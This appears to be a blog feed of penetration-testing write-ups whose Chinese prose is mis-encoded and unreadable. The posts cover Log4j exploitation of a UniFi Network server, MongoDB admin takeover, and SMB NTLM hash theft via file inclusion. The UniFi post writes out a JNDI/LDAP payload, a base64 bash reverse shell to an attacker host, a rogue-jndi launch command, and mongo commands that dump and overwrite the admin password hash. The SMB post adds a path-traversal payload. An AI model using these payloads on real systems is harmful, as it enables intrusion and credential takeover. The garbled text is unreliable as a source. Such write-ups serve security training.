src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-08_11-03.png" class="" title="2024-03-08_11-03.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>å‘ç°æ ¹ç›®å½•ä¸‹é¢æœ‰ä¸ªdevelopmentæ–‡ä»¶å¤¹ï¼Œåœ¨é‡Œé¢æœ‰ä¸€ä¸ªç½‘ç«™çš„æ¶æ„ç›®å½•å’Œä¸€äº›æ–‡ä»¶</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-42.png" class="" title="2024-03-07_14-42.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>å®¡è®¡ä¸€ä¸‹index.phpï¼Œå‘ç°ç”¨æˆ·åå’Œå¯†ç è¢«ä¼ é€’ç»™å‡½æ•°say_lverifier</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-43.png" class="" title="2024-03-07_14-43.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>æŸ¥çœ‹ä¸€ä¸‹&#x2F;usr&#x2F;lib&#x2F;phpä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°äº†ä¸€ä¸ªlverifier.soï¼Œå®ƒä¸è¢«è°ƒç”¨çš„å‡½æ•°åç§°å¾ˆç›¸ä¼¼ï¼Œè€Œä¸”å®ƒæ˜¯å¯è¯»çš„ï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶åé€†å‘åˆ†æä¸€ä¸‹</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_14-45.png" class="" title="2024-03-07_14-45.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>è¿™é‡Œæˆ‘ç”¨chiselæ­å»ºéš§é“ï¼Œå°†æµé‡ä»£ç†å‡ºæ¥ï¼Œæ–¹ä¾¿ä¸‹è½½lverifier.so</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_15-26.png" class="" title="2024-03-07_15-26.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>æµ…æµ…é€†å‘åˆ†æä¸€ä¸‹</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_17-57.png" class="" title="2024-03-07_17-57.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>æˆ‘çœ‹åˆ°åœ¨è°ƒç”¨say_lverifierå‡½æ•°ä¹‹åï¼Œç¨‹åºç»§ç»­è°ƒç”¨validating_userinputå‡½æ•°</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_18-05.png" class="" title="2024-03-07_18-05.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>sVar2æ˜¯è¾“å…¥å†…å®¹çš„å¤§å°ï¼Œå®ƒçš„æ•°æ®ç±»å‹æ˜¯ size_tï¼Œè¿™ä¸ªç±»å‹çš„æœ€å¤§å€¼æ˜¯ 0xffffï¼Œå³65535ï¼Œå½“æˆ‘æ’å…¥ä¸€ä¸ªé•¿åº¦è¶…è¿‡è¿™ä¸ªæ•°å­—çš„å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šå‘ç”Ÿæº¢å‡ºï¼Œå¹¶è¿›å…¥ä¸Šè¿°çš„æ£€æŸ¥æƒ…å†µã€‚éšåç¨‹åºå°†è°ƒç”¨ event_recorderå‡½æ•°æ¥æ‰§è¡Œæ–‡ä»¶ä¿å­˜æ“ä½œ</p><img src="/2024/03/08/%E4%BB%8EHAProxy%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%B0hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2024-03-07_19-10.png" class="" title="2024-03-07_19-10.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>å“ å¤ªèœäº†â€¦åˆ†æä¸åŠ¨äº†<br>åƒåˆé¥­äº†</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¤–ç½‘æ‰“ç‚¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”±Log4jå¼•èµ·çš„MongoDBææƒ</title>
    <link href="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/"/>
    <url>/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>å¼€å±€ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ˜¯ä¸€ä¸ªUniFi Network,è€Œä¸”ç‰ˆæœ¬ä¿¡æ¯ç›´æ¥æ‰“å°åœ¨ç™»é™†é¡µ</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-27.png" class="" title="2024-03-06_08-27.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>é‚£å°±ç›´æ¥æ ¹æ®ç‰ˆæœ¬ä¿¡æ¯ä¸Šgoogleæœä¸€ä¸‹çœ‹çœ‹ï¼Œæœ‰æ²¡æœ‰CVEå¯ä»¥åˆ©ç”¨æˆ–è€…é»˜è®¤ç”¨æˆ·åå¯†ç å°è¯•å¼±å£ä»¤ç™»é™†ï¼Œæœç´¢å‘ç°äº†å­˜åœ¨log4jæ¼æ´</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-29.png" class="" title="2024-03-06_08-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>log4jæ¼æ´å¯é€šè¿‡æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æ¥åˆ©ç”¨ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œå®Œå…¨ç ´ååº”ç”¨ç¨‹åºå¹¶ç ´åå…¶æ•°æ®<br>ç®€è¿°ä¸€ä¸‹è¯¥æ¼æ´çš„åŸç†ï¼š<br>org.apache.logging.log4j.core.pattern.MessagePatternConverterç±»çš„format()æ–¹æ³•å‘ç°æ—¥å¿—ä¸­åŒ…å«â€œ${â€å°±ä¼šå°†è¡¨è¾¾å¼çš„å†…å®¹æ›¿æ¢ä¸ºè¡¨è¾¾å¼è§£æåçš„å†…å®¹ï¼Œè€Œä¸æ˜¯è¡¨è¾¾å¼æœ¬èº«ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ„é€ ç¬¦åˆè¦æ±‚çš„è¡¨è¾¾å¼ä¾›ç³»ç»Ÿæ‰§è¡Œã€‚â€œ${â€å¯ä½¿ç”¨çš„å…³é”®è¯éå¸¸å¤šï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;java:os&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;hostName&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;jndi:logging/context-name&#125;</span><br></code></pre></td></tr></table></figure><p>org.apache.logging.log4j.core.lookup.StrSubstitutorä¸­æå–å‚æ•°å¹¶é€šè¿‡lookupè¿›è¡Œå†…å®¹æ›¿æ¢ï¼Œå½“æ—¥å¿—åœ¨æ‰“å°æ—¶é‡åˆ°â€${â€œåï¼ŒInterpolatorç±»ä»¥:å·ä½œä¸ºåˆ†å‰²ï¼Œå°†è¡¨è¾¾å¼å†…å®¹åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œå‰é¢éƒ¨åˆ†ä½œä¸ºprefixï¼Œåé¢éƒ¨åˆ†ä½œä¸ºkey,ç„¶åé€šè¿‡prefixå»æ‰¾å¯¹åº”çš„lookupï¼Œé€šè¿‡å¯¹åº”çš„lookupå®ä¾‹è°ƒç”¨lookupæ–¹æ³•ï¼Œæœ€åå°†keyä½œä¸ºå‚æ•°å¸¦å…¥æ‰§è¡Œï¼Œç»å…¸poc:${jndi:ldap:&#x2F;&#x2F;liuty_ip&#x2F;exp}ï¼Œç›¸ä¿¡å¤§å®¶çœ‹åˆ°è¿™ä¸ªpocå°±ä¼šæƒ³åˆ°jndiæ³¨å…¥ï¼Œæ²¡é”™ï¼Œå½“JNDIå˜é‡å¯æ§æ—¶å¼•å‘çš„æ¼æ´ï¼Œå®ƒå°†å¯¼è‡´è¿œç¨‹classæ–‡ä»¶åŠ è½½ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå½“åˆšæ‰é‚£ä¸ªpocè¢«ä¼ å…¥åˆ°log4jæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œlookupä¼šå°†JNDIæ³¨å…¥å¯æ‰§è¡Œè¯­å¥æ‰§è¡Œï¼Œç¨‹åºä¼šé€šè¿‡ldapåè®®è®¿é—®liuty_ipè¿™ä¸ªåœ°å€ï¼Œç„¶åliuty_ipå°±ä¼šè¿”å›ä¸€ä¸ªåŒ…å«javaä»£ç çš„classæ–‡ä»¶çš„åœ°å€ï¼Œç„¶åå†é€šè¿‡è¿”å›çš„åœ°å€ä¸‹è½½classæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œä»è€Œè¾¾æˆæ¶æ„æ”»å‡»çš„æ•ˆæœï¼Œæˆ‘ç”¨pptç®€å•ç”»ä¸€ä¸‹æ¼æ´åˆ©ç”¨è¿‡ç¨‹</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_12-37.png" class="" title="2024-03-06_12-37.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>ä¸ºäº†éªŒè¯æ¼æ´å­˜åœ¨çš„çœŸå®æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‘&#x2F;api&#x2F;loginå‘å‡ºPOSTè¯·æ±‚åï¼Œè¿›è¡ŒæŠ“åŒ…æ‹¦æˆªï¼Œå°†payloadè¾“å…¥åˆ°rememberå‚æ•°ä¸­ï¼Œå› ä¸ºPOSTæ•°æ®ä½œä¸ºJSONå¯¹è±¡å‘é€ï¼Œå¹¶ä¸”payloadåŒ…å«{}ï¼Œä¸ºäº†é˜²æ­¢å®ƒè¢«è§£æä¸ºå¦ä¸€ä¸ªJSONå¯¹è±¡ï¼Œæˆ‘ä»¬å°†å…¶æ‹¬åœ¨â€â€å†…ï¼Œä»¥ä¾¿å°†å…¶è§£æä¸ºå­—ç¬¦ä¸²ï¼Œè¿™é‡Œå°†rememberçš„trueä¿®æ”¹ä¸ºâ€${jndi:ldap:&#x2F;&#x2F;my_ip&#x2F;éšæ„}â€ã€‚<br>ï¼ˆè¿™é‡Œæ˜¾ç¤ºInvalidPayloadæ— æ•ˆï¼Œä½†å®é™…ä¸Špayloadæ­£åœ¨è¿è¡Œï¼‰</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-42.png" class="" title="2024-03-06_08-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”¨tcpdumpè¿›è¡Œæµé‡çš„ç›‘å¬ï¼Œåœ¨å‘é€å¸¦æœ‰payloadçš„æ•°æ®åŒ…é‚£ä¸€åˆ»ï¼Œæ˜¯æœ‰æµé‡è¢«ç›‘å¬åˆ°çš„ï¼Œæ‰€ä»¥è¯´payloadå®é™…æ˜¯è¿è¡Œçš„ï¼Œä¹Ÿè¯å®äº†æ¼æ´çš„å­˜åœ¨</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-41.png" class="" title="2024-03-06_08-41.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œå€ŸåŠ©åˆ°ä¸€ä¸ªå·¥å…·rogue-jndiï¼ˆrogueï¼‰ï¼Œè¿™ä¸ªå·¥å…·éœ€è¦æˆ‘ä»¬è‡ªå·±mvnæ„å»ºæˆjaråŒ…ï¼Œæ„å»ºæˆåŠŸåä¼šç”Ÿæˆåœ¨targetç›®å½•å½“ä¸­ï¼Œå¦‚ä¸‹</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-09.png" class="" title="2024-03-06_09-09.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>æ„å»ºæˆåŠŸä¹‹åï¼Œè¿è¡Œrogueåä¼šå¯åŠ¨ä¸€ä¸ªLDAPæœåŠ¡å™¨å¹¶å¯ä»¥ä½¿ç›®æ ‡æœåŠ¡å™¨æ¥æ”¶è¿æ¥å¹¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé¦–å…ˆæ„é€ å¹¶ä¼ é€’ä¸€ä¸ªpayloadï¼Œè¯¥payloadè´Ÿè´£åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªshellï¼Œæ–¹ä¾¿äº¤äº’å¼çš„æ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ï¼Œä¸è¿‡è¦å…ˆå¯¹payloadè¿›è¡ŒBase64ç¼–ç ï¼Œé˜²æ­¢å‡ºç°ä¸€äº›ç¼–ç é—®é¢˜ï¼Œæœ€åæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œè§£ç å¹¶æ‰§è¡Œå³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -c bash -i &gt;&amp;/dev/tcp/liuty_ip/port 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>éšåå¯åŠ¨rogueï¼ŒåŒæ—¶å°†payloadä½œä¸ºcommandå‚æ•°çš„ä¸€éƒ¨åˆ†ä»¥åŠå°†æˆ‘ä»¬çš„æ”»å‡»æœºIPä¼ é€’ç»™hostnameå‚æ•°ï¼Œå¹¶åŒæ—¶æ‰“å¼€ç›‘å¬ç«¯å£</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -jar target/RogueJndi-<span class="hljs-number">1.1</span><span class="hljs-selector-class">.jar</span> <span class="hljs-attr">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,ä¸Šä¸€æ­¥åŠ å¯†å®Œçš„æŒ‡ä»¤&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-attr">--hostname</span> <span class="hljs-string">&quot;æ”»å‡»ï¼ˆç›‘å¬ï¼‰ip&quot;</span><br></code></pre></td></tr></table></figure><p>å›åˆ°æˆ‘ä»¬æŠ“åŒ…çš„è¯·æ±‚å½“ä¸­ï¼ŒåŠ å…¥payloadï¼Œæ„é€ POSTè¯·æ±‚ï¼Œå°†rememberçš„å€¼æ”¹ä¸ºrogueä¸­mappingå€¼</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-string">&quot;remember&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;jndi:ldap:<span class="hljs-regexp">//m</span>y_ip:<span class="hljs-number">1389</span>/o=xxxxx&#125;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-20.png" class="" title="2024-03-06_09-20.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>å‘é€è¯·æ±‚åï¼Œæ”¶åˆ°ä¸€ä¸ªä¸æˆ‘ä»¬ldapæœåŠ¡å™¨çš„è¿æ¥æƒ…å†µï¼Œå¹¶ä¸”ç›‘å¬ç«¯å£ä¼šæ¥æ”¶åˆ°åå¼¹è¿‡æ¥çš„shell</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-21.png" class="" title="2024-03-06_09-21.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°shellä¹‹åï¼Œå…ˆæ”¹å˜ä¸€ä¸‹shell,ä½¿å…¶å˜å¾—äº¤äº’ï¼Œå¾€å¾€æ¸—é€è¿‡ç¨‹ä¸­äº¤äº’å¼çš„shellè¿˜æ˜¯å¾ˆé‡è¦çš„</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-22.png" class="" title="2024-03-06_09-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>é€šè¿‡æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°MongoDBæ•°æ®åº“å¼€ç€ï¼Œç«¯å£ä¸º27117,è¿›ç¨‹ä¸­ä¹Ÿæ²¡åˆ«çš„æ•°æ®åº“äº†ï¼Œåº”è¯¥å°±æ˜¯UniFiçš„åå°æ•°æ®åº“å§</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-23.png" class="" title="2024-03-06_09-23.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼ŒUniFié»˜è®¤æ•°æ®åº“çš„åç§°ä¸€èˆ¬ä¸ºaceï¼Œé€šè¿‡mongoå‘½ä»¤å°è¯•æå–ç®¡ç†å‘˜å¯†ç æ¥ä¸MongoDBæœåŠ¡è¿›è¡Œäº¤äº’</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">mongo <span class="hljs-attr">--port</span> <span class="hljs-number">27117</span> ace <span class="hljs-attr">--eval</span> &quot;db<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()<span class="hljs-selector-class">.forEach</span>(printjson);&quot;<br><br>##å‘½ä»¤è§£é‡Šï¼šdb<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()ä¸ºæŸ¥è¯¢adminè¡¨ä¸‹çš„æ‰€æœ‰æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ï¼›<span class="hljs-built_in">forEach</span>()ä¸ºéå†ï¼›printjsonä¸ºæ‰“å°jsonæ ¼å¼<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°äº†ç®¡ç†å‘˜è´¦å·å¯†ç ä»¥åŠç®¡ç†å‘˜è´¦æˆ·idå·</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-27.png" class="" title="2024-03-06_09-27.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>$6æ„æ€æ˜¯SHA-512åŠ å¯†ï¼Œå¦‚æœæˆ‘ä»¬ä¸çŸ¥é“ä¹Ÿæ²¡å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨hashidæ¥åˆ¤æ–­è¯¥å¯†ç çš„ç±»å‹ï¼Œç»éªŒè¯ç¡®å®ä¸ºSHA-512åŠ å¯†ï¼Œç ´è§£éš¾åº¦æŒºå¤§ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå·±åˆ›å»ºçš„å“ˆå¸Œæ›´æ”¹x_shadowå¯†ç å“ˆå¸Œï¼Œä»¥æ›¿æ¢ç®¡ç†å‘˜å¯†ç å¹¶é€šè¿‡ç®¡ç†é¢æ¿è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæˆ‘ä»¬ä½¿ç”¨mkpasswdæ¥åˆ›å»ºä¸€ä¸ªå¯†ç ï¼Œå°±123456å§ï¼Œå¹¶åˆ¶å®šSHA-512åŠ å¯†ç±»å‹</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-32.png" class="" title="2024-03-06_09-32.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>ç°åœ¨ä½¿ç”¨mongoå‘½ä»¤å¯¹æˆ‘ä»¬åˆ›å»ºçš„hashæ¥è¿›è¡Œæ›¿æ¢ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦é€šè¿‡ç®¡ç†å‘˜è´¦æˆ·çš„_idè¿›è¡Œæ ‡è¯†ï¼Œæ›¿æ¢å…¶x_shadow</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-34.png" class="" title="2024-03-06_09-34.png"><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">mongo --port <span class="hljs-number">27117</span> ace --<span class="hljs-built_in">eval</span> &#x27;db.admin.<span class="hljs-keyword">update</span>(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;ç®¡ç†å‘˜è´¦æˆ·id&quot;</span>)&#125;,&#123;$<span class="hljs-built_in">set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;SHA_512 Hash&quot;</span>&#125;&#125;)&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39.png" class="" title="2024-03-06_09-39.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>æ£€æŸ¥å¯†ç æ˜¯å¦æ›´æ–°ï¼Œé‡æ–°éå†ä¸€æ¬¡ï¼Œçœ‹åˆ°x_shadowå†…å®¹å·²ç»æ›¿æ¢æˆæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„hashå€¼</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39_1.png" class="" title="2024-03-06_09-39_1.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼ˆ123456ï¼‰ç™»é™†åˆ°UniFiåå°ï¼Œåœ¨åå°è®¾ç½®ä¸­å¿ƒé‡Œå‘ç°äº†sshè´¦å·å¯†ç â€¦è¿˜æ˜¯rootè´¦æˆ·</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-49.png" class="" title="2024-03-06_09-49.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>sshç›´æ¥è¿ï¼</p><img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-53.png" class="" title="2024-03-06_09-53.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¤–ç½‘æ‰“ç‚¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SMBçªƒå–NTLMhash</title>
    <link href="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/"/>
    <url>/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨æ‰“è¿›å†…ç½‘ä¹‹åï¼Œå¹¶ä¸”åœ¨éš§é“å»ºç«‹å®Œæ¯•çš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œå½“å‰å†…ç½‘ä¸»æœºçš„ä¸€ä¸ªæ¢æµ‹ï¼Œå‘ç°80ç«¯å£çš„httpæœåŠ¡å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè€Œä¸”åœ¨å‰æœŸå†…ç½‘ä¿¡æ¯æ”¶é›†çš„æ—¶å€™å‘ç°smbæœåŠ¡æ˜¯å¼€ç€çš„<br>ï¼ˆwinç³»ç»Ÿï¼‰<br>å…ˆç®€å•è¯´ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œurlä¸­æœ‰ä¸€ä¸ªpageå‚æ•°ï¼Œå€ŸåŠ©æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–ç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶ï¼Œæ¯”å¦‚hostsæ–‡ä»¶ï¼Œwinä¸‹çš„hostsæ–‡ä»¶åœ¨windows\system32\drivers\etc\hostsä¸­ï¼Œæ‰€ä»¥æ„é€ payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>windows<span class="hljs-regexp">/system32/</span>drivers<span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p>é¡µé¢å›æ˜¾å¦‚ä¸‹</p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09_1.png" class="" title="2024-03-05_11-09_1.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æˆ‘ä»¬ä¹‹æ‰€ä»¥ä¼šæˆåŠŸæ˜¯å› ä¸ºindex.phpé‡ŒåŒ…å«include()è¿™ä¸ªæ–¹æ³•ï¼Œå°†ä¼šè¯»å–pageè¿™ä¸ªå‚æ•°çš„å€¼ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰è¿›ä¸€æ­¥å¤„ç†pageå‚æ•°æ‰€å¾—åˆ°çš„å€¼æ—¶ï¼Œè¿™ä¸ªæ”»å‡»å°±ä¼šæˆåŠŸ<br>php includeå‡½æ•°çš„ç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">æ–‡ä»¶<span class="hljs-number">1</span>ï¼šroot.php<br>&lt;?php<br>$color = <span class="hljs-string">&#x27;green&#x27;</span>;<br>$fruit = <span class="hljs-string">&#x27;apple&#x27;</span>;<br>?&gt;<br>#############################################<br>æ–‡ä»¶<span class="hljs-number">2</span>ï¼štest.php<br>&lt;?php<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A&quot;</span><br>include <span 